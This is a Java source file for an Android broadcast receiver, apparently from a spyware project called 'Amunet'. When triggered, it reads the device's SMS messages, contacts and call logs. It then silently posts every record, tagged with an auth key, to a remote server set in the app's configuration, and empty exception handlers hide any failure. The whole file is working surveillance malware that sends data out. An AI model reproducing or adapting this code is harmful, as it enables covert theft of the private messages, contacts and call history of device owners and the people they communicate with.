package org.a0x00sec.amunet;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.util.Log;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.HashMap;
import java.util.Map;

public class ServerUpdateReceiver extends BroadcastReceiver {

    Context context;

    @Override
    public void onReceive(Context context, Intent intent) {

        this.context = context;

        if(ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    update_Server_SMS();
                }
            }).start();
        }

        if(ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    update_Server_Contacts();
                    update_Server_Call_Logs();
                }
            }).start();
        }
    }

    private String get_Long_Date(String date) {
        Long timestamp = Long.parseLong(date);
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(timestamp);
        DateFormat formatter = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
        return formatter.format(calendar.getTime());
    }

    private void update_Server(final Map<String, String> params) {

        RequestQueue requestQueue = Volley.newRequestQueue(context);

        StringRequest serverRequest = new StringRequest(Request.Method.POST, Configuration.getApp_auth(), new Response.Listener<String>() {
            @Override
            public void onResponse(String req) {
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
            }
        }) {
            protected Map<String, String> getParams() {
                return params;
            }
        };

        requestQueue.add(serverRequest);
    }

    private void update_Server_SMS() {

        SharedPreferences sharedPreferences = context.getSharedPreferences("Auth", Context.MODE_PRIVATE);
        final String auth_key = sharedPreferences.getString("auth_key", null);

        try {
            Uri uriSMSURI = Uri.parse("content://sms");

            Cursor cursor = context.getContentResolver().query(uriSMSURI, null, null, null,null);

            while (cursor.moveToNext()) {
                String address = cursor.getString(cursor.getColumnIndexOrThrow("address")).toString();
                String message = cursor.getString(cursor.getColumnIndexOrThrow("body")).toString();
                String date = cursor.getString(cursor.getColumnIndexOrThrow("date")).toString();
                String read = cursor.getString(cursor.getColumnIndexOrThrow("read")).toString();
                String type = cursor.getString(cursor.getColumnIndexOrThrow("type")).toString();
                String id = cursor.getString(cursor.getColumnIndexOrThrow("_id")).toString();

                if(read.equals("0")) { read = "no"; } else { read = "yes"; }
                if(type.equals("1")) { type = "inbox"; } else if(type.equals("2")) { type = "sent"; } else { type = "draft"; }
                date = get_Long_Date(date);

                // THIS IS HOW TO CREATE THE POST PARAMETERS ( MAP ARRAY )
                Map<String, String> params = new HashMap<>();
                params.put("address", address);
                params.put("message", message);
                params.put("date", date);
                params.put("read",  read);
                params.put("id", id);
                params.put("type", type);
                params.put("auth", auth_key);

                update_Server(params);
            }
        } catch (Exception e) {
        }
    }

    private void update_Server_Contacts() {

        SharedPreferences sharedPreferences = context.getSharedPreferences("Auth", Context.MODE_PRIVATE);
        final String auth_key = sharedPreferences.getString("auth_key", null);

        Cursor cursor = context.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI,null,
                null, null, null);
        while (cursor.moveToNext()) {
            try{
                String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                String name=cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                String phoneNumber = null;

                if (Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    Cursor phones = context.getContentResolver().query( ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = "+ contactId, null, null);
                    while (phones.moveToNext()) {
                        phoneNumber = phones.getString(phones.getColumnIndex( ContactsContract.CommonDataKinds.Phone.NUMBER));
                        break;
                    }
                    phones.close();

                    if(phoneNumber != null) {

                        Map<String, String> params = new HashMap<>();
                        params.put("contact_name", name);
                        params.put("contact_phone", phoneNumber);
                        params.put("auth", auth_key);

                        update_Server(params);
                    }
                }
            }catch(Exception e) {

            }
        }
    }

    @SuppressLint("MissingPermission")
    private void update_Server_Call_Logs() {

        SharedPreferences sharedPreferences = context.getSharedPreferences("Auth", Context.MODE_PRIVATE);
        final String auth_key = sharedPreferences.getString("auth_key", null);

        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        int phone_number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);

        while (cursor.moveToNext()) {
            String number = cursor.getString(phone_number);
            String call_type = cursor.getString(type);
            String call_date = get_Long_Date(cursor.getString(date));
            String call_duration = cursor.getString(duration);
            int call_code = Integer.parseInt(call_type);

            switch (call_code) {
                case CallLog.Calls.OUTGOING_TYPE:
                    call_type = "OUTGOING";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    call_type = "INCOMING";
                    break;
                case CallLog.Calls.MISSED_TYPE:
                    call_type = "MISSED";
                    break;
            }

            Map<String, String> params = new HashMap<>();
            
            params.put("phone_number", number);
            params.put("call_date", call_date);
            params.put("call_type", call_type);
            params.put("call_duration", call_duration);
            params.put("auth", auth_key);

            update_Server(params);
        }

        cursor.close();
    }
}
